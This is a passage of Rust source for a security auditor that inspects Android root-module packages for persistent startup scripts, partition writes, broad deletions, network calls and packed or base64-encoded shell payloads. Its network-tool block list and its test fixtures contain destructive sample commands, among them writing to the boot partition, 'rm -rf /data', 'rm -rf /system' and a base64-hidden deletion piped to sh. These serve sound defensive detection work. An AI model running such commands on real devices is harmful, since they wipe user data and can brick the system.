                        );
                        for source in &operands[operands.len() - 2..operands.len() - 1] {
                            let source_path = resolve_path(source, &variables, &current_dir);
                            if let Some(target) =
                                persistent_destination(&destination, Some(&source_path))
                            {
                                let content = lookup_archive_file(
                                    &source_path,
                                    &variables,
                                    module_id,
                                    &state.archive_files,
                                );
                                record_persistent_script(
                                    artifact, line, raw_line, target, content, module_id, config,
                                    state,
                                );
                            }
                        }
                    }
                }

                if name == "tee" {
                    let content = command_index.checked_sub(1).and_then(|previous| {
                        producer_payload(
                            commands[previous],
                            &variables,
                            module_id,
                            &state.archive_files,
                        )
                    });
                    for target in operands_before_redirection(&args)
                        .into_iter()
                        .filter(|arg| !arg.starts_with('-'))
                    {
                        let resolved = resolve_path(target, &variables, &current_dir);
                        if let Some(target) = persistent_destination(&resolved, None) {
                            record_persistent_script(
                                artifact,
                                line,
                                raw_line,
                                target,
                                content.clone(),
                                module_id,
                                config,
                                state,
                            );
                        }
                    }
                }

                let content = recover_redirected_output(
                    command_index,
                    &commands,
                    &args,
                    &variables,
                    module_id,
                    &state.archive_files,
                );
                for window in args.windows(2) {
                    if !matches!(window[0].as_str(), ">" | ">>") {
                        continue;
                    }
                    let resolved = resolve_path(&window[1], &variables, &current_dir);
                    if let Some(target) = persistent_destination(&resolved, None) {
                        record_persistent_script(
                            artifact,
                            line,
                            raw_line,
                            target,
                            content.clone(),
                            module_id,
                            config,
                            state,
                        );
                    }
                }
            }
        }
    }

    for (line, target, content, evidence) in extract_persistent_heredocs(text, module_id) {
        record_persistent_script(
            artifact,
            line,
            &evidence,
            target,
            Some(content),
            module_id,
            config,
            state,
        );
    }
}

fn analyze_invoked_module_scripts(
    artifact: &Artifact,
    text: &str,
    module_id: Option<&str>,
    config: &AuditConfig,
    state: &mut ScanState,
) {
    let mut variables = predefined_variables(module_id);
    let mut current_dir = module_id.map_or_else(
        || "$CWD".to_owned(),
        |_| variables.get("MODPATH").cloned().unwrap_or_default(),
    );
    for (line_index, raw_line) in logical_lines(text).iter().enumerate() {
        let tokens = shell_tokens(raw_line);
        collect_assignments(&tokens, &mut variables);
        for command in split_commands(&tokens) {
            let (name, args) = normalize_command(command);
            if name == "cd"
                && let Some(target) = args.first()
            {
                current_dir = resolve_path(target, &variables, &current_dir);
            }
            let Some(operand) = invoked_script_operand(command, &variables) else {
                continue;
            };
            let target = resolve_path(&operand, &variables, &current_dir);
            let Some(content) =
                lookup_archive_file(&target, &variables, module_id, &state.archive_files)
            else {
                continue;
            };
            add_finding(
                state,
                artifact,
                RULE_INVOKED_SCRIPT,
                Severity::Info,
                Some(line_index + 1),
                "Module-provided script is invoked",
                &format!("{} => {target}", raw_line.trim()),
            );
            if artifact.depth >= config.max_unpack_depth {
                add_finding(
                    state,
                    artifact,
                    RULE_UNPACK_LIMIT,
                    Severity::High,
                    Some(line_index + 1),
                    "Script call depth limit reached",
                    &format!("maximum depth is {}", config.max_unpack_depth),
                );
                continue;
            }
            let mut provenance = artifact.provenance.clone();
            provenance.push(format!(
                "module script invoked by {}:{}",
                artifact.path,
                line_index + 1
            ));
            scan_artifact(
                Artifact {
                    path: archive_relative_path(&target, module_id).unwrap_or(target),
                    bytes: content,
                    provenance,
                    depth: artifact.depth + 1,
                    force_shell: true,
                },
                module_id,
                config,
                state,
            );
        }
    }
}

fn invoked_script_operand(
    command: &[String],
    variables: &BTreeMap<String, String>,
) -> Option<String> {
    let expanded: Vec<_> = command
        .iter()
        .map(|token| expand_variables(token, variables))
        .collect();
    let mut index = expanded.iter().position(|token| !is_assignment(token))?;
    let mut direct_wrapper = false;
    loop {
        let wrapper = posix_basename(expanded.get(index)?);
        if !matches!(wrapper, "command" | "env" | "exec" | "nohup" | "time") {
            break;
        }
        direct_wrapper = true;
        index += 1;
        while index < expanded.len()
            && (expanded[index].starts_with('-') || is_assignment(&expanded[index]))
        {
            index += 1;
        }
    }

    let executable = expanded.get(index)?;
    let name = posix_basename(executable);
    if matches!(name, "sh" | "ash" | "bash") {
        index += 1;
        while index < expanded.len() {
            if expanded[index] == "-c"
                || expanded[index].starts_with('-')
                    && !expanded[index].starts_with("--")
                    && expanded[index][1..].contains('c')
            {
                return None;
            }
            if expanded[index] == "-o" {
                index += 2;
                continue;
            }
            if expanded[index] == "--" {
                index += 1;
                continue;
            }
            if !expanded[index].starts_with('-') {
                return Some(expanded[index].clone());
            }
            index += 1;
        }
        return None;
    }
    if matches!(name, "." | "source") {
        return expanded.get(index + 1).cloned();
    }
    if direct_wrapper
        || executable.contains('/')
        || executable.starts_with("./")
        || executable.starts_with("../")
    {
        return Some(executable.clone());
    }
    None
}

fn archive_relative_path(path: &str, module_id: Option<&str>) -> Option<String> {
    let id = module_id?;
    [
        format!("/data/adb/modules_update/{id}/"),
        format!("/data/adb/modules/{id}/"),
    ]
    .iter()
    .find_map(|prefix| path.strip_prefix(prefix).map(ToOwned::to_owned))
}

fn recover_redirected_output(
    command_index: usize,
    commands: &[&[String]],
    args: &[String],
    variables: &BTreeMap<String, String>,
    module_id: Option<&str>,
    archive_files: &BTreeMap<String, Vec<u8>>,
) -> Option<Vec<u8>> {
    if let Some(content) =
        producer_payload(commands[command_index], variables, module_id, archive_files)
    {
        return Some(content);
    }
    let expanded: Vec<_> = commands[command_index]
        .iter()
        .map(|token| expand_variables(token, variables))
        .collect();
    let (name, _) = normalize_command(&expanded);
    if has_decode_flag(args)
        && (name == "base64" || has_openssl_base64_grammar(args))
        && let Some(encoded) = decoder_input(
            command_index,
            commands,
            args,
            variables,
            module_id,
            archive_files,
        )
        && let Ok(encoded) = std::str::from_utf8(&encoded)
    {
        return decode_base64(encoded);
    }
    None
}

fn persistent_destination(destination: &str, source: Option<&str>) -> Option<String> {
    const DIRECTORIES: &[&str] = &[
        "/data/adb/service.d",
        "/data/adb/boot-completed.d",
        "/data/adb/bootcompleted.d",
    ];
    for directory in DIRECTORIES {
        if destination == *directory || destination == format!("{directory}/") {
            let source = source?;
            let basename = posix_basename(source);
            if basename.is_empty() {
                return None;
            }
            return Some(format!("{directory}/{basename}"));
        }
        if destination
            .strip_prefix(directory)
            .is_some_and(|suffix| suffix.starts_with('/') && suffix.len() > 1)
        {
            return Some(destination.to_owned());
        }
    }
    None
}

fn is_persistent_script_target(path: &str) -> bool {
    [
        "/data/adb/service.d/",
        "/data/adb/boot-completed.d/",
        "/data/adb/bootcompleted.d/",
    ]
    .iter()
    .any(|directory| path.starts_with(directory) && path.len() > directory.len())
}

#[allow(clippy::too_many_arguments)]
fn record_persistent_script(
    artifact: &Artifact,
    line: usize,
    raw_line: &str,
    target: String,
    content: Option<Vec<u8>>,
    module_id: Option<&str>,
    config: &AuditConfig,
    state: &mut ScanState,
) {
    let Some(content) = content else {
        add_finding(
            state,
            artifact,
            RULE_UNAUDITABLE_PERSISTENT_SCRIPT,
            Severity::High,
            Some(line),
            "Persistent startup script cannot be fully audited",
            &format!("{} => {target}", raw_line.trim()),
        );
        return;
    };
    add_finding(
        state,
        artifact,
        RULE_PERSISTENT_SCRIPT,
        Severity::Notice,
        Some(line),
        "Persistent startup script installed",
        &format!("{} => {target}", raw_line.trim()),
    );
    let mut provenance = artifact.provenance.clone();
    provenance.push(format!(
        "persistent script written by {}:{line}",
        artifact.path
    ));
    scan_derived_bytes(
        Artifact {
            path: target,
            bytes: Vec::new(),
            provenance,
            depth: artifact.depth,
            force_shell: true,
        },
        content,
        "persistent startup script",
        module_id,
        config,
        state,
    );
}

fn extract_persistent_heredocs(
    text: &str,
    module_id: Option<&str>,
) -> Vec<(usize, String, Vec<u8>, String)> {
    let lines: Vec<_> = text.lines().collect();
    let mut output = Vec::new();
    let mut variables = predefined_variables(module_id);
    let mut current_dir = module_id.map_or_else(
        || "$CWD".to_owned(),
        |_| variables.get("MODPATH").cloned().unwrap_or_default(),
    );
    let mut index = 0;
    while index < lines.len() {
        let header = lines[index];
        let tokens = shell_tokens(header);
        collect_assignments(&tokens, &mut variables);
        let (name, args) = normalize_command(&tokens);
        if name == "cd"
            && let Some(target) = args.first()
        {
            current_dir = resolve_path(target, &variables, &current_dir);
        }
        let Some(delimiter_index) = args.iter().position(|arg| arg == "<<") else {
            index += 1;
            continue;
        };
        let Some(raw_delimiter) = args.get(delimiter_index + 1) else {
            index += 1;
            continue;
        };
        let strip_tabs = raw_delimiter.starts_with('-');
        let delimiter = raw_delimiter.trim_start_matches('-');
        let target = args.windows(2).find_map(|window| {
            matches!(window[0].as_str(), ">" | ">>").then(|| {
                let resolved = resolve_path(&window[1], &variables, &current_dir);
                persistent_destination(&resolved, None)
            })?
        });
        let Some(target) = target else {
            index += 1;
            continue;
        };
        let mut body = Vec::new();
        let mut cursor = index + 1;
        let mut terminated = false;
        while cursor < lines.len() {
            let candidate = if strip_tabs {
                lines[cursor].trim_start_matches('\t')
            } else {
                lines[cursor]
            };
            if candidate == delimiter {
                terminated = true;
                break;
            }
            body.extend_from_slice(candidate.as_bytes());
            body.push(b'\n');
            cursor += 1;
        }
        if terminated {
            output.push((index + 1, target, body, header.to_owned()));
            index = cursor + 1;
        } else {
            index += 1;
        }
    }
    output
}

fn collect_block_target_assignments(line: &str, variables: &mut BTreeMap<String, String>) {
    let Some((left, right)) = line.split_once('=') else {
        return;
    };
    let name = left.split_whitespace().last().unwrap_or_default().trim();
    if !is_variable_name(name) {
        return;
    }
    if right.contains("find_block")
        || right.contains("/dev/block/")
        || right.contains("/dev/mapper/")
    {
        variables.insert(name.to_owned(), "/dev/block/$DYNAMIC".to_owned());
    }
}

fn analyze_network(
    artifact: &Artifact,
    line: usize,
    raw_line: &str,
    name: &str,
    state: &mut ScanState,
) {
    const NETWORK_COMMANDS: &[&str] = &[
        "curl", "wget", "aria2c", "nc", "ncat", "netcat", "socat", "ssh", "scp", "sftp", "ftp",
        "tftp", "git", "ping", "nslookup", "dig",
    ];
    if NETWORK_COMMANDS.contains(&name) || raw_line.contains("/dev/tcp/") {
        add_finding(
            state,
            artifact,
            RULE_NETWORK,
            Severity::Notice,
            Some(line),
            "Outbound network behavior",
            raw_line.trim(),
        );
    }
}

#[allow(clippy::too_many_arguments)]
fn analyze_delete(
    artifact: &Artifact,
    line: usize,
    raw_line: &str,
    name: &str,
    args: &[String],
    variables: &BTreeMap<String, String>,
    current_dir: &str,
    module_id: Option<&str>,
    state: &mut ScanState,
) {
    if !matches!(name, "rm" | "unlink" | "rmdir" | "shred") {
        return;
    }
    let targets: Vec<_> = operands_before_redirection(args)
        .into_iter()
        .filter(|arg| !arg.starts_with('-'))
        .map(|arg| resolve_path(arg, variables, current_dir))
        .filter(|target| !target.is_empty())
        .collect();
    if targets.is_empty() {
        return;
    }
    for target in targets {
        let (rule, severity, title) = if is_module_owned(&target, module_id) {
            (RULE_OWN_DELETE, Severity::Info, "Module-owned deletion")
        } else if is_broad_delete(&target) {
            (
                RULE_BROAD_DELETE,
                Severity::Critical,
                "Broad destructive deletion",
            )
        } else if contains_unresolved_variable(&target) {
            (
                RULE_UNKNOWN_DELETE,
                Severity::High,
                "Deletion target cannot be resolved",
            )
        } else {
            (
                RULE_UNKNOWN_DELETE,
                Severity::High,
                "Deletion outside the module directory",
            )
        };
        add_finding(
            state,
            artifact,
            rule,
            severity,
            Some(line),
            title,
            &format!("{} => {target}", raw_line.trim()),
        );
    }
}

#[allow(clippy::too_many_arguments)]
fn analyze_writes(
    artifact: &Artifact,
    line: usize,
    raw_line: &str,
    name: &str,
    args: &[String],
    variables: &BTreeMap<String, String>,
    current_dir: &str,
    state: &mut ScanState,
) {
    let mut targets = Vec::new();
    let mut found_block_target = false;
    if name == "dd" {
        targets.extend(
            args.iter()
                .filter_map(|arg| arg.strip_prefix("of="))
                .map(ToOwned::to_owned),
        );
    }
    if is_destructive_writer(name) {
        let operands: Vec<_> = operands_before_redirection(args)
            .into_iter()
            .filter(|arg| !arg.starts_with('-'))
            .cloned()
            .collect();
        if matches!(name, "cp" | "mv") {
            targets.extend(operands.last().cloned());
        } else {
            targets.extend(operands);
        }
    }
    for window in args.windows(2) {
        if matches!(window[0].as_str(), ">" | ">>") {
            targets.push(window[1].clone());
        }
    }

    for target in targets {
        let resolved = resolve_path(&target, variables, current_dir);
        if is_block_device_path(&resolved) {
            found_block_target = true;
            add_finding(
                state,
                artifact,
                RULE_PARTITION_WRITE,
                Severity::Critical,
                Some(line),
                "Partition or block-device write",
                &format!("{} => {resolved}", raw_line.trim()),
            );
        } else if contains_unresolved_variable(&resolved)
            && (name == "dd" || is_destructive_writer(name))
        {
            add_finding(
                state,
                artifact,
                RULE_DESTRUCTIVE_WRITE_UNKNOWN,
                Severity::High,
                Some(line),
                "Destructive write target cannot be resolved",
                raw_line.trim(),
            );
        }
    }
    if is_flash_writer(name) && !found_block_target {
        add_finding(
            state,
            artifact,
            RULE_FLASH_TOOL,
            Severity::High,
            Some(line),
            "Partition flashing or erasure tool",
            raw_line.trim(),
        );
    }
}

fn correlate_binary_execution(state: &mut ScanState) {
    let binaries = state.binaries.clone();
    let scripts = state.scripts.clone();
    for binary in binaries {
        let basename = posix_basename(&binary);
        for (script_path, text, provenance) in &scripts {
            for (index, line) in text.lines().enumerate() {
                if line.contains(&binary)
                    || line.contains(&format!("$MODPATH/{binary}"))
                    || line.contains(&format!("./{binary}"))
                    || (basename.len() > 2
                        && shell_tokens(line).iter().any(|token| token == basename))
                {
                    state.findings.push(Finding {
                        rule_id: RULE_BINARY_EXECUTED.to_owned(),
                        severity: Severity::Notice,
                        path: script_path.clone(),
                        line: Some(index + 1),
                        title: "Precompiled binary is executed or loaded".to_owned(),
                        evidence: format!("{} references {binary}", line.trim()),
                        provenance: provenance.clone(),
                    });
                }
            }
        }
    }
}

fn add_finding(
    state: &mut ScanState,
    artifact: &Artifact,
    rule_id: &str,
    severity: Severity,
    line: Option<usize>,
    title: &str,
    evidence: &str,
) {
    state.findings.push(Finding {
        rule_id: rule_id.to_owned(),
        severity,
        path: artifact.path.clone(),
        line,
        title: title.to_owned(),
        evidence: evidence.to_owned(),
        provenance: artifact.provenance.clone(),
    });
}

fn detect_gzexe(bytes: &[u8], text: &str) -> Option<(usize, String)> {
    if !text.contains("gzip -cd") || !text.contains("tail") || !text.contains("skip=") {
        return None;
    }
    let skip = text
        .lines()
        .take(32)
        .find_map(|line| line.trim().strip_prefix("skip="))?
        .trim_matches(|character: char| character == '\'' || character == '"')
        .parse::<usize>()
        .ok()?;
    let offset = line_offset(bytes, skip)?;
    if bytes.get(offset..offset + 2) != Some(&[0x1f, 0x8b]) {
        return None;
    }
    Some((
        offset,
        format!("gzexe-style shell with gzip payload beginning at line {skip}"),
    ))
}

fn line_offset(bytes: &[u8], one_based_line: usize) -> Option<usize> {
    if one_based_line == 0 {
        return None;
    }
    if one_based_line == 1 {
        return Some(0);
    }
    let mut line = 1;
    for (index, byte) in bytes.iter().enumerate() {
        if *byte == b'\n' {
            line += 1;
            if line == one_based_line {
                return Some(index + 1);
            }
        }
    }
    None
}

fn looks_like_shell(path: &str, bytes: &[u8]) -> bool {
    path.ends_with(".sh")
        || is_persistent_script_target(path)
        || bytes.starts_with(b"#!")
        || bytes
            .get(..4096.min(bytes.len()))
            .is_some_and(|head| head.windows(7).any(|window| window == b"#!/bin/"))
}

fn is_elf(bytes: &[u8]) -> bool {
    bytes.starts_with(b"\x7fELF")
}

fn describe_elf(bytes: &[u8]) -> String {
    let class = match bytes.get(4) {
        Some(1) => "ELF32",
        Some(2) => "ELF64",
        _ => "ELF",
    };
    let endian = bytes.get(5).copied().unwrap_or(1);
    let kind = bytes
        .get(16..18)
        .map(|pair| {
            if endian == 2 {
                u16::from_be_bytes([pair[0], pair[1]])
            } else {
                u16::from_le_bytes([pair[0], pair[1]])
            }
        })
        .map_or("unknown", |value| match value {
            1 => "relocatable",
            2 => "executable",
            3 => "shared object",
            4 => "core",
            _ => "unknown",
        });
    format!("{class} {kind}")
}

fn binary_has_network_indicators(bytes: &[u8]) -> bool {
    const INDICATORS: &[&[u8]] = &[
        b"http://",
        b"https://",
        b"connect",
        b"getaddrinfo",
        b"libcurl",
    ];
    INDICATORS.iter().any(|indicator| {
        bytes
            .windows(indicator.len())
            .any(|window| window == *indicator)
    })
}

fn profile_binary(path: &str, bytes: &[u8]) -> BinaryProfile {
    BinaryProfile {
        path: path.to_owned(),
        basename: posix_basename(path).to_owned(),
        base64_like: contains_any_bytes(bytes, &[b"base64", b"--decode", b"BIO_f_base64"]),
        openssl_like: contains_any_bytes(bytes, &[b"OpenSSL", b"libcrypto", b"EVP_"]),
    }
}

fn contains_any_bytes(bytes: &[u8], indicators: &[&[u8]]) -> bool {
    indicators.iter().any(|indicator| {
        bytes
            .windows(indicator.len())
            .any(|window| window == *indicator)
    })
}

fn logical_lines(text: &str) -> Vec<String> {
    let mut output = Vec::new();
    let mut current = String::new();
    for line in text.lines() {
        if line.ends_with('\\') {
            current.push_str(line.trim_end_matches('\\'));
            current.push(' ');
        } else {
            current.push_str(line);
            output.push(std::mem::take(&mut current));
        }
    }
    if !current.is_empty() {
        output.push(current);
    }
    output
}

fn shell_tokens(line: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut chars = line.chars().peekable();
    let mut quote = None;
    while let Some(character) = chars.next() {
        if let Some(delimiter) = quote {
            if character == delimiter {
                quote = None;
            } else if character == '\\' && delimiter == '"' {
                if let Some(next) = chars.next() {
                    current.push(next);
                }
            } else {
                current.push(character);
            }
            continue;
        }
        match character {
            '\'' | '"' => quote = Some(character),
            '#' if current.is_empty() => break,
            '\\' => {
                if let Some(next) = chars.next() {
                    current.push(next);
                }
            }
            ' ' | '\t' | '\r' => push_token(&mut tokens, &mut current),
            ';' | '|' | '&' => {
                push_token(&mut tokens, &mut current);
                let mut operator = character.to_string();
                if chars.peek() == Some(&character) {
                    operator.push(chars.next().unwrap_or(character));
                }
                tokens.push(operator);
            }
            '>' | '<' => {
                push_token(&mut tokens, &mut current);
                let mut operator = character.to_string();
                if chars.peek() == Some(&character) {
                    operator.push(chars.next().unwrap_or(character));
                }
                tokens.push(operator);
            }
            '(' | ')' => {
                push_token(&mut tokens, &mut current);
                tokens.push(character.to_string());
            }
            _ => current.push(character),
        }
    }
    push_token(&mut tokens, &mut current);
    tokens
}

fn push_token(tokens: &mut Vec<String>, current: &mut String) {
    if !current.is_empty() {
        tokens.push(std::mem::take(current));
    }
}

fn split_commands(tokens: &[String]) -> Vec<&[String]> {
    let mut commands = Vec::new();
    let mut start = 0;
    for (index, token) in tokens.iter().enumerate() {
        if matches!(token.as_str(), ";" | "|" | "&&" | "||" | "&" | "(" | ")") {
            if start < index {
                commands.push(&tokens[start..index]);
            }
            start = index + 1;
        }
    }
    if start < tokens.len() {
        commands.push(&tokens[start..]);
    }
    commands
}

fn split_pipeline_groups(tokens: &[String]) -> Vec<Vec<&[String]>> {
    let mut groups = Vec::new();
    let mut group = Vec::new();
    let mut start = 0;
    for (index, token) in tokens.iter().enumerate() {
        match token.as_str() {
            "|" => {
                if start < index {
                    group.push(&tokens[start..index]);
                }
                start = index + 1;
            }
            ";" | "&&" | "||" | "&" | "(" | ")" => {
                if start < index {
                    group.push(&tokens[start..index]);
                }
                if !group.is_empty() {
                    groups.push(std::mem::take(&mut group));
                }
                start = index + 1;
            }
            _ => {}
        }
    }
    if start < tokens.len() {
        group.push(&tokens[start..]);
    }
    if !group.is_empty() {
        groups.push(group);
    }
    groups
}

fn operands_before_redirection(args: &[String]) -> Vec<&String> {
    let end = args
        .iter()
        .position(|arg| matches!(arg.as_str(), ">" | ">>" | "<" | "<<"))
        .unwrap_or(args.len());
    args[..end].iter().collect()
}

fn normalize_command(command: &[String]) -> (String, Vec<String>) {
    let mut index = command
        .iter()
        .position(|token| !is_assignment(token))
        .unwrap_or(command.len());
    while index < command.len()
        && matches!(
            command[index].as_str(),
            "command" | "env" | "exec" | "if" | "then" | "do" | "!" | "time"
        )
    {
        index += 1;
        while index < command.len() && command[index].starts_with('-') {
            index += 1;
        }
    }
    if index >= command.len() {
        return (String::new(), Vec::new());
    }
    let mut name = posix_basename(&command[index]).to_owned();
    index += 1;
    if matches!(name.as_str(), "busybox" | "toybox") && index < command.len() {
        name.clone_from(&command[index]);
        index += 1;
    }
    (name, command[index..].to_vec())
}

fn collect_assignments(tokens: &[String], variables: &mut BTreeMap<String, String>) {
    for token in tokens {
        if matches!(token.as_str(), ";" | "|" | "&&" | "||") {
            continue;
        }
        let Some((name, value)) = token.split_once('=') else {
            continue;
        };
        if is_variable_name(name) {
            if name == "MODDIR" && (value.contains("$0") || value.contains("${0")) {
                continue;
            }
            variables.insert(name.to_owned(), expand_variables(value, variables));
        }
    }
}

fn is_assignment(token: &str) -> bool {
    token
        .split_once('=')
        .is_some_and(|(name, _)| is_variable_name(name))
}

fn is_variable_name(name: &str) -> bool {
    !name.is_empty()
        && name.chars().enumerate().all(|(index, character)| {
            character == '_'
                || character.is_ascii_alphanumeric()
                    && (index > 0 || character.is_ascii_alphabetic())
        })
}

fn predefined_variables(module_id: Option<&str>) -> BTreeMap<String, String> {
    let id = module_id.unwrap_or("$MODID");
    let module_path = format!("/data/adb/modules_update/{id}");
    BTreeMap::from([
        ("MODID".to_owned(), id.to_owned()),
        ("MODPATH".to_owned(), module_path.clone()),
        ("MODDIR".to_owned(), module_path),
        ("TMPDIR".to_owned(), "/data/adb/ksu/.audit-tmp".to_owned()),
    ])
}

fn expand_variables(value: &str, variables: &BTreeMap<String, String>) -> String {
    let mut output = String::new();
    let chars: Vec<_> = value.chars().collect();
    let mut index = 0;
    while index < chars.len() {
        if chars[index] != '$' {
            output.push(chars[index]);
            index += 1;
            continue;
        }
        if index + 1 < chars.len() && chars[index + 1] == '{' {
            let mut end = index + 2;
            while end < chars.len() && chars[end] != '}' {
                end += 1;
            }
            if end < chars.len() {
                let name: String = chars[index + 2..end].iter().collect();
                if let Some(expanded) = variables.get(&name) {
                    output.push_str(expanded);
                } else {
                    output.push_str(&format!("${{{name}}}"));
                }
                index = end + 1;
                continue;
            }
        }
        let mut end = index + 1;
        while end < chars.len() && (chars[end] == '_' || chars[end].is_ascii_alphanumeric()) {
            end += 1;
        }
        if end == index + 1 {
            output.push('$');
            index += 1;
            continue;
        }
        let name: String = chars[index + 1..end].iter().collect();
        if let Some(expanded) = variables.get(&name) {
            output.push_str(expanded);
        } else {
            output.push('$');
            output.push_str(&name);
        }
        index = end;
    }
    output
}

fn resolve_path(value: &str, variables: &BTreeMap<String, String>, current_dir: &str) -> String {
    let expanded = expand_variables(value, variables);
    if expanded.is_empty() {
        return String::new();
    }
    if contains_unresolved_variable(&expanded) || expanded.contains("$(") || expanded.contains('`')
    {
        return expanded;
    }
    // Module scripts always use Android/POSIX paths. Host Path semantics would
    // treat `/system` as relative when the audit tests run on Windows.
    let joined = if expanded.starts_with('/') {
        expanded
    } else {
        format!("{}/{expanded}", current_dir.trim_end_matches('/'))
    };
    normalize_path(&joined)
}

fn normalize_path(path: &str) -> String {
    let mut components: Vec<String> = Vec::new();
    for component in path.split('/') {
        match component {
            "" | "." => {}
            ".." => {
                components.pop();
            }
            value => components.push(value.to_owned()),
        }
    }
    format!("/{}", components.join("/"))
}

fn posix_basename(path: &str) -> &str {
    path.trim_end_matches('/')
        .rsplit('/')
        .next()
        .unwrap_or(path)
}

fn is_module_owned(path: &str, module_id: Option<&str>) -> bool {
    path.starts_with("/data/adb/ksu/.audit-tmp/")
        || path == "/data/adb/ksu/.audit-tmp"
        || module_id.is_some_and(|id| {
            let active = format!("/data/adb/modules/{id}");
            let updated = format!("/data/adb/modules_update/{id}");
            path == active
                || path.starts_with(&format!("{active}/"))
                || path == updated
                || path.starts_with(&format!("{updated}/"))
        })
}

fn is_broad_delete(path: &str) -> bool {
    matches!(
        path.trim_end_matches('/'),
        "" | "/"
            | "/data"
            | "/data/adb"
            | "/data/adb/modules"
            | "/data/adb/modules_update"
            | "/system"
            | "/vendor"
            | "/product"
            | "/odm"
            | "/system_ext"
    ) || path.ends_with("/*")
}

fn is_block_device_path(path: &str) -> bool {
    path.starts_with("/dev/block/")
        || path.starts_with("/dev/mapper/")
        || path.starts_with("/dev/bootdevice/")
        || path.starts_with("/dev/mmcblk")
        || path.starts_with("/dev/mtd")
        || path
            .strip_prefix("/dev/sd")
            .is_some_and(|tail| !tail.is_empty())
}

fn is_destructive_writer(name: &str) -> bool {
    name == "blkdiscard"
        || name == "wipefs"
        || name == "flash_erase"
        || name == "nandwrite"
        || name == "mtd"
        || name == "truncate"
        || name == "fallocate"
        || name == "cp"
        || name == "mv"
        || name == "tee"
        || name.starts_with("mkfs")
}

fn is_flash_writer(name: &str) -> bool {
    matches!(
        name,
        "blkdiscard"
            | "wipefs"
            | "flash_erase"
            | "flash_image"
            | "nandwrite"
            | "write_raw_image"
            | "mtd"
            | "fastboot"
    ) || name.starts_with("mkfs")
}

fn contains_unresolved_variable(value: &str) -> bool {
    value.contains('$')
}

fn is_safe_zip_path(path: &str) -> bool {
    !path.is_empty()
        && !path.starts_with('/')
        && !path.starts_with('\\')
        && !path.split('/').any(|component| component == "..")
}

fn parse_module_id(bytes: &[u8]) -> Option<String> {
    String::from_utf8_lossy(bytes).lines().find_map(|line| {
        let (key, value) = line.split_once('=')?;
        (key.trim() == "id").then(|| value.trim().to_owned())
    })
}

fn sha256_bytes(bytes: &[u8]) -> String {
    hex_digest(Sha256::digest(bytes).as_slice())
}

fn hex_digest(bytes: &[u8]) -> String {
    const HEX: &[u8; 16] = b"0123456789abcdef";
    let mut output = String::with_capacity(bytes.len() * 2);
    for byte in bytes {
        output.push(char::from(HEX[usize::from(byte >> 4)]));
        output.push(char::from(HEX[usize::from(byte & 0x0f)]));
    }
    output
}

#[cfg(test)]
mod tests {
    use super::*;
    use flate2::{Compression, write::GzEncoder};
    use std::io::{Cursor, Write};
    use zip::write::SimpleFileOptions;

    fn rules(report: &AuditReport) -> Vec<&str> {
        report
            .findings
            .iter()
            .map(|finding| finding.rule_id.as_str())
            .collect()
    }

    fn gzip(bytes: &[u8]) -> Vec<u8> {
        let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
        encoder.write_all(bytes).unwrap();
        encoder.finish().unwrap()
    }

    fn gzexe(payload: &[u8]) -> Vec<u8> {
        let stub =
            b"#!/system/bin/sh\nskip=5\ntail -n +$skip <\"$0\" | gzip -cd > /tmp/x\n/tmp/x\n";
        let mut output = stub.to_vec();
        output.extend(gzip(payload));
        output
    }

    fn module_zip(entries: &[(&str, &[u8])]) -> Vec<u8> {
        let cursor = Cursor::new(Vec::new());
        let mut writer = zip::ZipWriter::new(cursor);
        for (path, bytes) in entries {
            writer
                .start_file(*path, SimpleFileOptions::default())
                .unwrap();
            writer.write_all(bytes).unwrap();
        }
        writer.finish().unwrap().into_inner()
    }

    fn elf_with_markers(markers: &[u8]) -> Vec<u8> {
        let mut elf = vec![0_u8; 64];
        elf[..6].copy_from_slice(b"\x7fELF\x02\x01");
        elf[16..18].copy_from_slice(&2_u16.to_le_bytes());
        elf.extend_from_slice(markers);
        elf
    }

    #[test]
    fn detects_partition_writes_and_broad_delete() {
        let script = b"#!/system/bin/sh\nBLOCK=/dev/block/by-name/boot\nbusybox dd if=boot.img of=$BLOCK\nrm -rf /data\n";
        let report = scan_file_bytes("customize.sh", script, &AuditConfig::default());
        assert!(rules(&report).contains(&RULE_PARTITION_WRITE));
        assert!(rules(&report).contains(&RULE_BROAD_DELETE));
        assert!(report.has_critical());
        assert_eq!(report.required_confirmation_presses(), 2);
    }

    #[test]
    fn module_owned_delete_is_info() {
        let script = b"#!/system/bin/sh\nrm -rf \"$MODPATH/cache\"\n";
        let mut state = ScanState::default();
        scan_artifact(
            Artifact {
                path: "customize.sh".to_owned(),
                bytes: script.to_vec(),
                provenance: Vec::new(),
                depth: 0,
                force_shell: false,
            },
            Some("example"),
            &AuditConfig::default(),
            &mut state,
        );
        assert_eq!(state.findings.len(), 1);
        assert_eq!(state.findings[0].rule_id, RULE_OWN_DELETE);
        assert_eq!(state.findings[0].severity, Severity::Info);
    }

    #[test]
    fn recursively_audits_gzexe_payloads() {
        let inner = b"#!/system/bin/sh\ncurl https://example.com/payload\nrm -rf /system\n";
        let packed = gzexe(&gzexe(inner));
        let report = scan_file_bytes("service.sh", &packed, &AuditConfig::default());
        assert_eq!(report.derived_artifacts, 2);
        assert!(rules(&report).contains(&RULE_PACKED_SHELL));
        let delete = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_BROAD_DELETE)
            .unwrap();
        assert_eq!(delete.provenance.len(), 2);
        assert!(rules(&report).contains(&RULE_NETWORK));
    }

    #[test]
    fn unpacking_limit_is_reported() {
        let packed = gzexe(&gzexe(b"#!/system/bin/sh\necho done\n"));
        let config = AuditConfig {
            max_unpack_depth: 1,
            ..AuditConfig::default()
        };
        let report = scan_file_bytes("service.sh", &packed, &config);
        assert!(rules(&report).contains(&RULE_UNPACK_LIMIT));
    }

    #[test]
    fn corrupt_gzip_is_reported_as_uninspectable() {
        let report = scan_file_bytes(
            "service.sh.gz",
            b"\x1f\x8bthis is not a gzip stream",
            &AuditConfig::default(),
        );
        let finding = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_UNPACK_LIMIT)
            .unwrap();
        assert_eq!(finding.severity, Severity::High);
    }

    #[test]
    fn audits_static_base64_shell_payload() {
        let script = b"#!/system/bin/sh\necho 'cm0gLXJmIC9kYXRhCg==' | base64 -d | sh\n";
        let report = scan_file_bytes("service.sh", script, &AuditConfig::default());
        assert!(rules(&report).contains(&RULE_PACKED_SHELL));
        let delete = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_BROAD_DELETE)
            .unwrap();
